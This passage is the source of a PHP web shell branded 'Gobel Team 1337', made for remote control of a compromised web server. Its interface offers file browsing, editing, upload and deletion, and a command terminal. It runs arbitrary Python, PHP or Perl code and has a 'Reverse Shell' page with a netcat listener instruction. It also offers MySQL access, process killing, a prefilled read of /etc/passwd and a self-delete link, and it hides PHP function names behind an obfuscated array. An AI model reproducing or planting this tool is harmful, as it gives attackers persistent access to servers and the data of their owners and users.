98wIgWpZhEC9CgKhBo2aNGvRqk27Dp26dOvRq0+/AZFBQ4aNGDVm3IRJU6bNmDVn3oJFS5atWLVm3YZNW7bt2LVn34FDR46dOHXm3IVLV67duHXn3oNHT569ePXm3YdPX779+PXnX0xcQlJKWkZWTl5BUalGEFz0AgAGAAB9n/ydurubacaYjRNTFzadM3HAdE3bOOvps/fEhQgjGjRa0+tRk07t+o0ZDZHa3KnX48u3Dn1abHrwacC4Xz/+DJuwZ8ekeAm6JDqQZNe+E4eOHHuS7NypM1NSfOh25cKlVC/etEqXJkOWTNkG5ciTK1+BIoWKlXhWqlyZClUqLRtSo1qtOq/erbg2bcaNe7dmzVm0ZMu8BduarduwGqJCdIgJseF/HIyc7KV5mQYGjgZQ2oUnLb+0qLi0ILUoM7+IxbW0KB8kY2RkaAqiXQ3c3MC0m5sLiHYzMDAAAFHEcrt4ATWMz0rzQBTFZ77wFRdFRaGIEIKKm2bTR4gdDLFBaJtebRpjO2rUfYoYEKqWSv3TNooiKKLQB+gUN8GNvoGv4M7H0FtqL5d7zpzfYbTx526v+097mp3TH4OkEv18aPGH+JR+HxjKnT8MCrcY3PjTyrVvKB1stRFeIbzE9wnqRT2pnJ8ZShNZA1kdu6eY15Afoh5h3gveg89A0gJlQT/A7I1SwijR5mGf7cEu82CHcdhmFdhiZdhkLmwwB0rMBhFhLUMnPNya1/GkFKeTPMUrPOSCf/FYr0yJS1NuxQ1dqcjWYJ0BWOEq5EMTcmEGsuEK6E4alp0lKFj43WuC/qcRDc1I+s6bYizrCNoUi9bgarmSiDUFgZJT7FPathutFknLppCtoniRbVMYaLSBOUZD5H6CpG1VJerf+FUft+qro6HI/IGMSujQ4EUd8urMLzJZe0cA) format('woff');
    	font-weight: normal;
    	font-style: normal;
    }
    *{
      margin:0;
      padding:0;
      font-family:ubuntumono;
      font-size: 16px;
      box-sizing: border-box;
      outline:0;
      color:white}
    html,body{
      width:100%;
      max-width:100%
    }
    .f-title h1{
      width: 100%;
      border-bottom: 1px solid #2f89fc;
      line-height: 0.1em;
      margin: 10px 0 20px;
    }
    .f-title h1 span{
      font-size: 24px;
      color: #2f89fc !important;
      padding:10px;
      background-color: #131217;
    }
    .f-title{
      position: relative;
      width:100%;
      margin: 2em 0;
    }
    a{
      text-decoration:none}
    .runcode{
        table-layout: fixed !important;
        width: 100% ;
      }
    .ov{
      max-height:300px;
      overflow: auto;
    }
    .sts{
      color:#fff;padding:6px 0;margin-right:6px;
    }
    .data_table td{
      overflow: auto;
      padding:10px;
    }
    .data_table{
      padding: 10px 0;
    }
    .fa-angle-right{
      font-size:24px;
      vertical-align:middle;
      padding: 0 8px;
    }
    #tools *, #mass *{
      color:white;
    }
    .data_table td,th{border:1px solid #2d3436;max-width: 300px;min-width: 70px;text-align: left;}
    .data_table td{max-width: 300px;min-width: 70px;}
    .data_table th{padding:10px;color:#fff}
    .msg{
      position: fixed;
      bottom:0;
      left:0;
      width:100%;
      height: 20px;
      height: 40px;
      z-index: 999;
      line-height: 40px;
      text-align: center;
      font-size: 20px;
      animation: msg 1.5s;
      opacity: 0;
    }
    .bor{
      background: #2f89fc;
	  color: #000;
      padding: 0 8px;
      margin-right: 4px;
    }
    .err{
      background-color: red;
    }
    .ok{
      background-color: #4cd137;
    }
    @keyframes msg {
      0%{
        opacity: 1;
        transform: scale(1);
      }
      90%{
        opacity: 1;
        transform: scale(1);
      }
      100%{
        opacity: 1;
        transform: scale(0);
      }
    }
    .act{
      text-align:center;
    }
    .act td{
      text-align:center;
      padding:10px;
    }
    .head{
      padding:20px;
    }
    .head h1{
      font-family:Sedgwick Ave Display;
      font-size:42px;
      color:#fff}
    .filendirInfo .title h1{
      font-family:Sedgwick Ave Display;
      font-size:42px;
      color:#fff;
      padding:10px;
      text-align:center}
    .wrapper-dir td{
      text-align:center}
    .wrapper-dir .filename{
      width:200px;text-align:left}
    .info{
      text-align:center;
      color:white}
    .leftside{
      width:50%;
      padding-right:20px;
    }
    .banner{
      width:1%;padding:0 20px !important;
      border-spacing: 5px;
    }
    .banner pre{
      color:#2f89fc
    }
    .main{
      width:100%;
    }
    .rightside{
      float:right;
      width:50%;
      position:relative}
    .rightsides{
      margin-left:20px;
    }
    .toolsandinfo{
    }
    .toolsandinfo table, .toolsandinfo table tr{
      width: 100%;
    }
    .toolsandinfo table td{
      padding:3px;
    }
    .filendirInfo a, .filendirInfo a:hover{
      color:#fff}
    .filendirInfo .featureForm, .filendirInfo .featureForm tr {
      width:100%;
    }
    .filendirInfo .featureForm td{
      padding:8px;
      width:auto}
    input[type="text"],input[type="password"], textarea, select{
      padding:8px;
      box-sizing: border-box;
      resize:none;
      border:1px solid #1a202c;
      color:#fff !important;
      background:#1a202c;
      outline:none}
    option{
	  color:#fff !important;
      background-color:rgb(21, 24, 28);
    }

    .namefile_act td{
      padding:10px;
    }
    .filendirInfo .featureForm option{
      color:black}
    .w-100{
      width:100%;
    }
    .feature{
      background:#1a202c;
    }
    .filendirInfo textarea{
      width:100%;
      height:250px;
    }
    .fix{
      position:fixed}
    .body{
      padding:0 20px;
      position:relative}
    .atas th{
      border:0;
      border-bottom:1px solid rgb(47, 51, 54);
      padding:20px;
      color:#fff !important;
    }
    .bw{
      border:1px solid black;padding:8px;margin-left:6px
    }
    .atas:hover{
      background-color: transparent !important;
    }
    body{
      background-color:#131217;}
    .box{
      padding:10px;
      margin-bottom:20px;
    }
    .iblock{
      display: inline-block;
    }
    .path a{
      display:inline-block;
      padding:2px 6px;
      color:#fff !important;
    }
    .path .button{
      background:#2f89fc;
      border:1px solid #2f89fc;
      cursor: pointer;
    }
    .path{
      margin:0;
      padding-bottom:15px;
    }
    .menu{
      text-align:left;padding: 0 20px;}
    .menu ul{
      list-style-type: none;display: flex;flex-wrap: wrap;}
    .menu ul li{
      font-size: 0;}
    .menu a{
     padding:0 10px;display: block;color:#2f89fc}
    .menu a:hover{
     background-color:#2f89fc;color:#000 !important}
    .menu form{
     display:none}
    input[type="submit"], button{
      background:#2f89fc;
      border:1px solid #2f89fc;
      cursor: pointer;
      color:#fff !important;
      padding:8px;}
    input[type="submit"], button *{
    }
    input[type="submit"]:hover, button:hover *{
      color:black !important;
    }
    input[type="submit"]:hover, button:hover{
      background:#fff;
      border:1px solid #fff;
      color:black !important;}
    .action{
      border:1px solid #fff;
      display: inline-block;
      color:#fff !important;
      padding: 8px;
      margin-right:5px;
    }
    .action:hover{
      color:#000 !important;
      background-color: #fff;
    }
    .actionfile {
      background-color:#1a202c;
    }
    .actionfile .button{
      background-color:transparent;
      border:0;
    }
    .actionfile .button:hover{
      border:0;
    }
    .button{
      background:#2f89fc;
      border:1px solid #2f89fc;
      cursor: pointer;
      color:#fff !important;
      padding:8px;
      margin-right:8px;
      display: inline-block;
    }
    .button:hover{
      background:#fff;
	  border:1px solid #fff;
	  color:#000 !important;
    }
    .menu #uploader input[type="file"]{
      color:black}
    .menu #uploader {
      padding:10px;
    }
    .menu table{
      margin-left: auto;
      margin-right: auto;
    }
    .bg-white{
      background-color:#fff;
    }
    .bg-o-blue{
      border:2px solid #2f89fc;
    }
    .bg-o-blue *{
      color: #2f89fc !important;
    }
    .bg-yellow{
      border:2px solid yellow;
    }
    .bg-yellow *{
      color: yellow !important;
    }
    .bg-white *{
      color:black !important;
    }
    .no-bg{
      background-color: rgb(47, 51, 54) !important;
      background: rgb(47, 51, 54) !important;
      color:#fff !important;
    }
    .windows{
      position: fixed;
      top: 50%;
      left: 50%;
      width: 60%;
      transform: translate(-50%, -50%);
      height: 55%;
      background-color: #1a202c
    }
    .active{
      background-color:white !important;
      color:black !important;
    }
    .blackout::before{
      content:"";
      position: fixed;
      top: 0;
      left: 0;
      bottom:0;
      right:0;
      background-color: #000;
      opacity: 0.5;
    }
    a:hover{
      color:#fff !important;
    }
    .row{
      padding:10px 0;
      display: flex;
      flex-direction: row;
    }
    .col-0{
      max-width: 100%;
      flex:0;
    }
    .col-auto{
      max-width: 100%;
      flex:auto;
    }
    .terminal-input input[type="text"]{
      background:transparent;
      border:0;
      width:100%;
      padding:0 !important;
      display: inline-block;
    }
    .terminal-input .cemde{
      color:red;
      font-weight: bold;
      border:0;
    }
    .terminal-input input{
      vertical-align:middle;
    }
    .terminal{
      max-height:400px;
      overflow:auto}
    .right{
      float:right
    }
    .menu a{
      line-height: 40px;
      height: auto;
    }
    .curpo{
      cursor:pointer}
    .load{
      position:absolute;
      width:100%;
      height:100%;
    }
    .password-section{
      top:50%;
      left: 50%;
      transform: translate(-50%, -50%);
      position: absolute;
      text-align:center;
    }
    .password-section pre{
      padding: 10px;
      color:#fff;
      font-size: 16px;
      text-align:left;
    }
    .password-section span{
      color:#fff;
      font-size: 24px;
      text-align:left;
    }
    .additional input[type="text"]{
      width: auto;
    }
    .additional table{
      table-layout:fixed;
      width:100%;
    }
    .additional{
      border-top : 1px solid #2f89fc;
      margin-top:30px;
    }
    .additional td{
      padding:10px 0;
    }
    .additional td .title-td{
      display: block;
      padding:0 !important;
      margin-bottom: 10px;
      width:100%;
    }
    .additional form{
      height: auto;
      display: inline;
    }
    .additional input[type="submit"]{
      padding:8px !important;
      display: inline;
      height: 100%;
    }
    .ainfo table{
      table-layout:fixed;
      border-collapse:collapse;
    }
    .ainfo .v{
      word-wrap:break-word;
    }
    .ainfo .e{
      font-weight:bolder;
    }
    .ainfo td{
      border-bottom:1px solid rgb(47, 51, 54);
      padding:8px;

    }
    .ainfo .h td,.ainfo .h th, .ainfo h2, .ainfo h1{
      padding: 10px;
      background:#2f89fc;
      font-size:16px;
      color:black !important;
    }
    .ainfo .h td *, .ainfo .h th *, .ainfo h2 *, .ainfo h1 *{
      color:black !important;
    }
    .h h1{
      font-size:16px;
    }
    .multiple-select .header td{
      padding:10px 0;
    }
    .multiple-select td{
      text-align:left !important;
    }
    .multiple-select{
      padding:10px;
      border-bottom: 1px solid rgb(47, 51, 54);
    }
    .title-td{
      width:8%;
      padding-left:20px !important;
      font-weight:bold;
      color:#2f89fc;
    }
    .feature-tbl{
      width:auto !important;
      margin-left: auto;
      margin-right: auto;
      table-layout: auto;
    }
    #input-text, #output-text{
      width:100% !important;
    }
    .b{
      padding:2px 6px;margin-left:6px;
    }
    .fb{
      color:#1a202c;background:red;
    }
    .wb{
      color:#1a202c;background:yellow;
    }
    .sb{
      color:#1a202c;background:#32ff6a;
    }
    .lib{
      color:#fff;padding:6px 0;margin-right:6px
    }
    .info-file td{
      text-align:left !important;
      border:0 !important;
    }
    .mr{
      margin-right: 6px;
    }
    .header-bg{
    }
    .filendirInfo table, .filendirInfo .fileanddir tr{
      width:100%}
    .filendirInfo .fileanddir th{
      text-align:center;
      padding:20px;}
    .filendirInfo .fileanddir td{
      padding:10px;}
    .filendirInfo .fileanddir{
      }

    .filendirInfo .fileanddir tr:hover{
      background-color:#fff;
    }
    .filendirInfo .fileanddir tr:hover td *,
	.filendirInfo .fileanddir tr:hover td
	{
      color:black !important;
    }
	.filendirInfo .fileanddir tr:hover select,
	.filendirInfo .fileanddir tr:hover button,
	.filendirInfo .fileanddir tr:hover option
	{
	  color:white!important;
	}
	.filendirInfo .fileanddir tr:hover button:hover
	{
      background:#000 !important;
	  color: #fff !important;
	}
    .filendirInfo .fileanddir tr:hover td .wb,
	.filendirInfo .fileanddir tr:hover td .sb,
	.filendirInfo .fileanddir tr:hover .fb
	{
      background:#000 !important;
	  color: #fff !important;
    }
  </style>
  <body>
<?php 
  Main();

function Main(){
  HeaderContent();
  BodyContent();
  TerminalWindow();
  Footer();
}
function BodyContent(){
  global $WKWK;
  ?>
  <div class="body">
    <div class="main">
      <div class="box filendirInfo">
        <?php
        MSG();
        if(!isset($_GET['act']) && !isset($_GET['f'])){
          Title("File Manager");
          Explore();
        }
        if(isset($_GET['act'])){
          Action($_GET['act']);
        }
        if(isset($_GET['f'])){
          if(function_exists("feature".$_GET['f'])){
            ("feature".$_GET['f'])();
          }else{
            Title("404 :(");
          }
        }
        FooterTools();
        ?>
      </div>
    </div>
  </div>
<?php
}
function HeaderContent(){
  global $WKWK, $at; 
  ?>
    <div class="body header-bg black">
      <?php 
      ShortInfo();
      PathPage(); 
      ?>
    </div>
  <?php
  Menu();
}
function ShortInfo(){
  global $WKWK, $at;
  ?>
      <div class="box toolsandinfo">
        <table cellspacing=0>
          <tr>
            <td class="banner" rowspan="8">
              <pre>

Gobel Team 1337

<center> (c) Gobel Team </center>
</pre>
            </td>
            <td class="title-td">kernel</td>
            <td> в‡’ </td>
            <td style="word-break:break-all;word-wrap:break-word"><?=$WKWK[54](); ?></td>
          </tr>
          <tr>
            <td class="title-td">disable function</td>
            <td> в‡’ </td>
            <td style="word-break:break-all;word-wrap:break-word"><?=(!empty($WKWK[55]('disable_functions'))) ? $WKWK[55]('disable_functions') : "NONE"; ?></td>
          </tr>
          <tr>
            <td class="title-td">whoami</td>
            <td> в‡’ </td>
            <td style="word-break:break-all;word-wrap:break-word"><?= get_current_user() ?> (uid=<?= getmyuid() ?> gid=<?= getmygid() ?>)</td>
          </tr>
          <tr>
            <td class="title-td">server ip</td>
            <td> в‡’ </td>
            <td ><span><?=$_SERVER["SERVER_ADDR"] ?></span><span class="title-td">your ip</span> в‡’ <span><?=$_SERVER["REMOTE_ADDR"] ?></span>
          </tr>
          <tr>
            <td class="title-td">software</td>
            <td> в‡’ </td>
            <td style="word-break:break-all;word-wrap:break-word"><?= $_SERVER["SERVER_SOFTWARE"] ?></td>
          </tr>
          <tr>
            <td class="title-td">hdd</td>
            <td> в‡’ </td>
            <td style="word-break:break-all;word-wrap:break-word"><?= Size($WKWK[59](empty($rn[0])?"/":$rn[0])) ?> / <?= Size($WKWK[60](empty($rn[0])?"/":$rn[0])) ?></td>
          </tr>
          <tr>
            <td class="title-td">lib</td>
            <td> в‡’ </td>
            <td>
              <span class='lib'>GCC<?=(Xute("gcc --help")) ? text("ON", "successb") : text("OFF", "failb") ?></span>
              <span class='lib'>WGET<?=(Xute("wget --help")) ? text("ON", "successb") : text("OFF", "failb") ?></span>
              <span class='lib'>cURL<?=(Xute("curl --help")) ? text("ON", "successb") : text("OFF", "failb") ?></span>
              <span class='lib'>PYTHON<?=(Xute("python -h")) ? text("ON", "successb") : text("OFF", "failb") ?></span>
              <span class='lib'>PERL<?=(Xute("perl --version")) ? text("ON", "successb") : text("OFF", "failb") ?></span>
            </td>
          </tr>
          <tr>
            <td class="title-td">drives</td>
            <td> в‡’ </td>
            <td style="word-break:break-all;word-wrap:break-word"><?= CheckDrives() ?></td>
          </tr>
        </table>
      </div>
  <?php
}
function PathPage(){
  global $rn;
  ?>
  <div class="box path">
  <?php
  for ($i = 0;$i < count($rn);$i++)
  {
      if ($rn[$i] == "" && $i == 0)
      {
          echo "<a class='state' href='?x=".Enx("/")."'>/ </a>";
          $path = "/";
          continue;
      }
      if ($rn[$i] == "")
      {
          continue;
      }
      $path = (empty($path)) ? "" : $path;
      $path = $path . $rn[$i] . "/";
      echo "<a class='state' href='?x=" . Enx($path) . "'>" . $rn[$i] . "</a>/";
  }
  echo "[ ".PermColor($path)." ] ";
  echo "
    <a class='button right' href='?sad=deleteme'>Self Delete</a>
    <a class='button right' href='?sad=out'>Log Out</a>
  ";
  ?>
  </div>
  <?php
}
function Explore(){
  global $WKWK, $at;
  $all = $WKWK[8]($at);
  echo "
  <div class='wrapper-dir'>
  <form autocomplete='off' method=\"post\" id=\"checkedF\">
  <table cellspacing=0 class='fileanddir'>
        <tr class='atas'>
          <th></th>
          <th class='filename'>Name</th>
          <th>Size</th>
          <th>Lastmod</th>
          <th>Perm</th>
          <th>Owner:Group</th>
          <th>Action</th>
        </tr>";
  foreach ($all as $su){
      if ($su == '.' || $su == '..') continue;
      if ($WKWK[28]($at . $su)) {
        echo "
        <tr>
          <td><input class='checkboxDark' type=\"checkbox\" name=\"path_dir[]\" value=\"" . htmlspecialchars($at . $su."/") . "\"></td>
          <td class='filename'><a href='?x=" . Enx($at . $su."/") . "'><i class=\"fas fa-folder\" style='margin-right:6px'></i>" . $su . "</a></td>
  <td>-</td>
<td>" . lastmod($at . $su) . "</td>
          <td>".PermColor($at . $su )."</td>
          <td>".OG($at . $su)."</td>
          <td>
          <form method='post'>
          <select name='file_action' class='selectAct'>
            <option data-param='goto' value='?x=" . Enx($at) . "&y=".Enx($su)."&act=rename'>rename</option>
            <option data-param='goto' value='?x=" . Enx($at) . "&y=".Enx($su)."&act=chmod'>chmod</option>
            <option data-param='copy' value='". $at . $su."/" ."'>copy</option>
            <option data-param='goto' value='?x=" . Enx($at) . "&y=".Enx($su)."&act=touch'>touch</option>
            <option data-param='move' value='". $at . $su ."'>move</option>
            <option data-param='delete' value='?x=" . Enx($at) . "&y=".Enx($su)."&act=del' data-filename='".$su."'>delete</option>
          </select>
          <button type='submit' class='actSubmit'>>></button>
          </form>
          </td>
        </tr>";
      }
  }
  foreach ($all as $su){
    global $WKWK, $at;
    if ($WKWK[29]($at . $su)) {
      echo "
      <tr>
        <td><input class='checkboxDark' type=\"checkbox\" name=\"path_dir[]\" value=\"" . htmlspecialchars($at . $su) . "\"></td>
        <td class='filename'><a href='?x=" . Enx($at) . "&y=".Enx($su)."&act=read'><i class=\"fas fa-file\" style='margin-right:6px'> </i>" . $su . "</a></td>
        <td>" . Size($WKWK[61]($at . $su)) . "</td>
        <td>" . lastmod($at . $su) . "</td>
        <td><a>".PermColor($at . $su)."</a></td>
        <td>".OG($at . $su)."</td>
          <td>
          <form method='post'>
          <select name='file_action' class='selectAct'>
            <option data-param='goto' value='?x=" . Enx($at) . "&y=".Enx($su)."&act=rename'>rename</option>
            <option data-param='goto' value='?x=" . Enx($at) . "&y=".Enx($su)."&act=chmod'>chmod</option>
            <option data-param='goto' value='?x=" . Enx($at) . "&y=".Enx($su)."&act=edit'>edit</option>
            <option data-param='delete' value='?x=" . Enx($at) . "&y=".Enx($su)."&act=del' data-filename='".$su."'>delete</option>
            <option data-param='download' value='" .$at . $su  . "'>download</option>
            <option data-param='goto' value='?x=" . Enx($at) . "&y=".Enx($su)."&act=touch'>touch</option>
            <option data-param='copy' value='" . $at . $su . "'>copy</option>
            <option data-param='move' value='" . $at . $su . "'>move</option>
          </select>
          <button type='submit' class='actSubmit'>>></button>
          </form>
          </td>
        </tr>
      </tr>";
    };
  }
  echo "</table></form>";
  if(isset($_POST["act"])){
    if($_POST["act"] == "delete"){
      if (isset($_POST["path_dir"])) {
        if($_POST["path_dir"]){
          $pathFilesHTML = "";
          foreach ($_POST["path_dir"] as $key => $value) {
            $pathFilesHTML .= Delete($value)."<br>";
          }
          Status("Selected Files Status", $pathFilesHTML);
        }
      }
    }
    if($_POST["act"] == "paste"){
      if(!empty($_SESSION["copy"])){
        foreach($_SESSION["copy"] as $path_dir){
          CopyFile($path_dir, $at);
          $pathFilesHTML .= $path_dir."<br>";
        }
        Status("Pasted File/Folder",$pathFilesHTML);
        unset($_SESSION["copy"]);
      }
      if(!empty($_SESSION["move"])){
        foreach($_SESSION["move"] as $path_dir){
          CopyFile($path_dir, $at);
          Delete($path_dir);
          $pathFilesHTML .= $path_dir."<br>";
        }
        Status("Moved File/Folder",$pathFilesHTML);
        unset($_SESSION["move"]);
      }
    }
    if($_POST["act"] == "pastef"){
      if(!empty($_SESSION["copy"])){
        foreach($_SESSION["copy"] as $path_dir){
          CopyFile($path_dir, $_POST["path"]);
          $pathFilesHTML .= $path_dir."<br>";
        }
        Status("Pasted File/Folder",$pathFilesHTML);
        unset($_SESSION["copy"]);
      }
      if(!empty($_SESSION["move"])){
        foreach($_SESSION["move"] as $path_dir){
          CopyFile($path_dir, $_POST["path"]);
          Delete($path_dir);
          $pathFilesHTML .= $path_dir."<br>";
        }
        Status("Moved File/Folder",$pathFilesHTML);
        unset($_SESSION["move"]);
      }
    }
    if($_POST["act"] == "copy"){
      if(!empty($_SESSION["move"])) unset($_SESSION["move"]);
      $_SESSION["copy"] = $_POST["path_dir"];
    }
    if($_POST["act"] == "move"){
      if(!empty($_SESSION["copy"])) unset($_SESSION["copy"]);
      $_SESSION["move"] = $_POST["path_dir"];
    }
  }
printf('
<table class="multiple-select">
<tr>
  <td>Actions</td>
  <td>
    <form autocomplete=\'off\' method="post" id="actionForm">
      <select name="act">
%s
<option value="delete">DELETE
        </option>
        <option value="copy">COPY
        </option>
        <option value="move">MOVE
        </option>
      </select>
      <input type="submit" id="submitAct" value="EXECUTE!">
    </form>
  </td>
</tr>
</table></div>', ((!empty($_SESSION["copy"]) || !empty($_SESSION["move"])) ? '<option value="paste">PASTE</option>' : ""));
}
function Menu(){
  global $at;
  ?>
  <div class="feature">
    <div class="menu">
      <ul>
        <li>
          <a class='state' href='<?= $_SERVER["PHP_SELF"] ?>'>Home</a>
        </li>
        <li>
          <a class='state' href='?x=<?=Enx($at)?>'>Explore</a>
        </li>
        <li>
          <a id="toolsbutt" href="#" class="curpo">Tools</a>
        </li>
        <ul id="tools"  style="display:flex">
          <li>
            <a class='state' href="?x=<?=Enx($at)?>&f=hash">Hash</a>
          </li>
          <li>
            <a class='state' href="?x=<?=Enx($at)?>&f=ende">Encode/Decode</a>
          </li>
        </ul>
        <li>
          <a class='state' href="#" id="terminal-show">Terminal</a>
        </li>
        <li>
          <a class='state' href="?x=<?=Enx($at)?>&f=bc">Reverse Shell</a>
        </li>
        <li>
          <a class='state' href="?x=<?=Enx($at)?>&f=mysql">Mysql</a>
        </li>
        <li>
          <a class='state' href="?x=<?=Enx($at)?>&f=runcode">Run Code</a>
        </li>
        <li>
          <a class='state' href="?x=<?=Enx($at)?>&f=allinfo">phpinfo</a>
        </li>
        <li>
          <a class='state' href="?x=<?=Enx($at)?>&f=process">Process</a>
        </li>
      </ul>
    </div>
</div>
  <?php
}
function Upload(){
  global $WKWK, $at;
  if(isset($_FILES['upya']))
  {
    if(@$WKWK[43]($_FILES['upya']['tmp_name'], $_FILES['upya']['name']))
    {
      Status("Status",$_FILES['upya']['name']." Uploaded in this dir!!!");
    }
    else
    {
      Status("Status");
      Status($_FILES['upya']['name']." Can't Upload :( try other dir");
    }
  }
}
function featureruncode(){
  Title("Run Code");
  echo '
  <div class="runcodeWrapper">
    <div class="content-runcode">
        <table class="featureForm runcode active-tab">
          <tr>
            <td>Code</td>
            <td>Output</td>
          </tr>
          <tr>
            <td></td>
            <td>
              <select class="lang-select">
                <option value="python">Python</option>
                <option value="php">PHP</option>
                <option value="perl">Perl</option>
              </select>
              <button name="run" id="exec"><i class="fas fa-play"></i> RUN!</button></form>
            </td>
          </tr>
          <tr>
            <td>
              <textarea name="code" id="code" style="height:500px"></textarea>
            </td>
            <td>
              <textarea style="height:500px" readonly id="runcode-output"></textarea>
            </td>
          </tr>
        </table>
    </div>
  </div>';
}
function featurebc(){
  Title("Reverse Shell");
  printf('
            <div class="bc">
              <center>
                <p>run nc -lnvp {your port} in your terminal before clicking REVERSE IT</p>
                <br>
                <form autocomplete=\'off\' method="POST" class="featureForm">
                  <select name="lang" id="lang">
                    <option value="php">PHP
                    </option>
                    <option value="perl">Perl
                    </option>
                    <option value="python">Python
                    </option>
                  </select>
                  <input type="text" name="ipport" id="ipport" value="%s">
                  <button type="submit" id="reverse">REVERSE IT!
                  </button>
                </form>
                <span id="bc-msg"></span>
              </center>
            </div>', $_SERVER["REMOTE_ADDR"].":666" );
}
function featureprocess(){
  global $WKWK, $at;
  Title("Process");
  echo "
  <table class=\"feature-tbl\">
  ";
  if(isset($_POST['kill'])){
    echo "<tr><td>";
    if(Kill($_POST['pid'])){
      echo $_POST['pid']." Killed";
    }else{
      echo "Something Wrong";
    }
    echo "</td></tr>";
  }
  echo "
  <tr>
  <td>
  <form method='post'>
  <input type='text' name='pid' value='PID'>
  <input type='submit' name='kill' value='kill'>
  </form>
  </td>
  </tr>
  <tr>
  <td>
  <pre>".((IsWin()) ? Xute("tasklist") : Xute("ps aux"))."</pre>
  </td>
  </tr>
  </table>";
}
function featureallinfo(){
  Title("All Info");
  global $WKWK, $at;
  $i = Epal("phpinfo();");
  $i = $WKWK[18]("/<body>(.*?)<\/body>/is", $i, $m);
  $i = $m[1];
  $i = $WKWK[37]('/<a href="http:\/\/www.php.net\/">(.*?)<\/a>/', "", $i);
  $i = $WKWK[37]('/<a href="http:\/\/www.zend.com\/">(.*?)<\/a>/', "", $i);
  echo "<div class='ainfo'>";
  echo $i;
  echo "</div>";
}
function featureende(){
  global $WKWK, $at;
  Title("Encode/Decode");
  echo "
  <table>
  <tr>
    <td>
     <table>
      <tr>
        <td>LIBRARY</td>
        <td>:</td>
        <td>
  <select id='encode-decode-lib'>
    <option value='b64'>BASE64</option>
    <option value='hex'>HEX</option>
    <option value='rot13'>STR_ROT13</option>
    <option value='url'>URL ENCODE/DECODE</option>
  </select>
  </td>
      </tr>
      <section id='options'>
      <tr>
        <td>ENCODE/DECODE</td>
        <td>:</td>
        <td>
        <select id='encode-decode' class='open'>
          <option value='encode'>ENCODE</option>
          <option value='decode'>DECODE</option>
        </select>
        </td>
      </tr>
      </section>
      <tr><td></td><td></td><td><button id='convert'>>></button></td></tr>
      </table>
    </td>
    <td>
      <textarea id='input-text'>INPUT</textarea>
      <textarea id='output-text'>OUTPUT</textarea>
    </td>
  </tr>
  </table>
  ";
}
function featurehash(){
  global $WKWK, $at;
  Title("Hash");
  echo "
  <table class=\"feature-tbl\">
    <tr>
      <td>
        <select id='algos'>
        ";
        $algos = $WKWK[62]();
        foreach($algos as $key => $algo){
          echo "<option value='".$algo."'>".strToUpper($algo)."</option>";
        }
        echo "
        </select>
      </td>
      <td>
        <input type='text' id='unhash-text' value='password'>
      </td>
      <td>
        <input type='submit' id='hashthat' value='GO!'>
      </td>
    </tr>
    </table>
    <pre id='hash-output' style='margin:10px;'></pre>
  ";
}
function TerminalWindow(){
  global $WKWK, $at;
  echo '
  <div class="blackout" style="display:none">
    <div class="windows">
      <div class="menu-window" style="border-radius:20px 20px 0 0;display:inline-block;width:100%;text-align:center;height:auto;">
        <div style="float:right">
          <a href="#" class="curpo" id="clear" style="display: inline-block;line-height: 40px;padding: 0 20px;color:#fff !important;">CLEAR</a>
    <a href="#" class="curpo" id="hide" style="display: inline-block;line-height: 20px;padding: 0 5px;margin-right:10px;background:red;border-radius:50%"><i class="fas fa-times"></i></a>
        </div>
      </div>
      <div id="terminal-wrapper" style="height:calc(100% - 40px);overflow:auto;padding:10px;position:relative;">
<pre id="output">
</pre>
<div class="terminal-input"><pre><div class="row" style="padding:0!important">
<div class="col-0"><span id="input_cmdnya"><a style="color:red">Loading...</a> </span>
</div>
<div class="col-auto"><input type="text" id="cmd" autocomplete="off" placeholder="command here [then enter]" name="cmd" value="">
</div>
</div>
</pre>
</div>
      </div>
    </div>
  </div>
  ';
}
function Title($x){
  echo "<div class='f-title'><h1><span>".$x."</span></h1></div>";
}
function HeaderAction($at, $xyz)
{
  global $WKWK;
  $html = '
  <tr class="namefile_act">
    <td>
      <table class="info-file" border="0" cellspacing="0">
        <tr>
        <td>Filename</td>
        <td>:</td>
        <td>'.$xyz.'</td>
        </tr>
        <tr>
        <td>Path</td>
        <td>:</td>
        <td>'.$at.$xyz.'</td>
        </tr>
        <tr>
        <td>Perm</td>
        <td>:</td>
        <td>'.PermColor($at.$xyz).'</td>
        </tr>
        <tr>
        <td>Last Mod</td>
        <td>:</td>
        <td>'.lastmod($at.$xyz).'</td>
        </tr>
      </table>
    </td>
  </tr>
  ';
  $html .= '<tr >';
  $html .= '<td class="actionfile"  style="padding:10px">';
  $html .= '<a class="button '.(($_GET["act"] == "chmod") ? "active" : "").'" href="?x='.Enx($at).'&y='.Enx($xyz).'&act=chmod">Chmod</a>';
  $html .= '<a class="button '.(($_GET["act"] == "rename") ? "active" : "").'" href="?x='.Enx($at).'&y='.Enx($xyz).'&act=rename">Rename</a>';
  $html .= '<a class="button '.(($_GET["act"] == "del") ? "active" : "").'" href="?x='.Enx($at).'&y='.Enx($xyz).'&act=del">Delete</a>';
  $html .= '<a class="button '.(($_GET["act"] == "touch") ? "active" : "").'" href="?x='.Enx($at).'&y='.Enx($xyz).'&act=touch">Touch</a>';
  if(!$WKWK[28]($at.$xyz)){
    $html .= '<a class="button '.(($_GET["act"] == "edit") ? "active" : "").'" href="?x='.Enx($at).'&y='.Enx($xyz).'&act=edit">Edit</a>';
  }
  $html .= '</td>';
  $html .= '</tr>';
  return $html;
}
function FooterTools(){
	global $WKWK, $at;
        $s = "";
        if(!isset($_GET["f"])&&!isset($_GET["act"])){
          $s = '
            <td>
              <span class="title-td">Search File в®§</span>
              <form autocomplete=\'off\' method="post">
                <input type="hidden" id="path" value="%s">
                <input type="text" name="searchfile" id="searchbox" value="file.php">
                <input type="submit" id="search" name="" value="SEARCH!">
              </form>
            </td>
          ';
        }
	      printf('<div class="box additional">
            <table>
              <tr>
                <td>
                  <span class="title-td">Create File в®§</span>
                  <form autocomplete=\'off\' method="post">
                    <input type="text" name="foldername">
                    <input type="submit" name="cr8folder" value=">>">
                  </form>
                </td>
                <td>
                  <span class="title-td">Change Dir в®§</span>
                  <form autocomplete=\'off\' method="post">
                    <input type="text" name="goto" value="/home/skuy/public_html/">
                    <input type="submit" name="cdir" value=">>">
                  </form>
                </td>
                <td>
                  <span class="title-td">Read File в®§</span>
                  <form autocomplete=\'off\' method="post">
                    <input type="text" name="path" value="/etc/passwd">
                    <input type="submit" name="read" value=">>">
                  </form>
                </td>
              </tr>
              <tr>
                <td>
                  <span class="title-td">Create File в®§</span>
                  <form autocomplete=\'off\' method="post">
                      <input type="text" name="filename">
                      <input type="submit" name="cr8file" value=">>">
                  </form>
                </td>
                '.$s.'
                <td>
                <span class="title-td">Uploader в®§</span>
                <form autocomplete=\'off\' method="post" enctype="multipart/form-data">
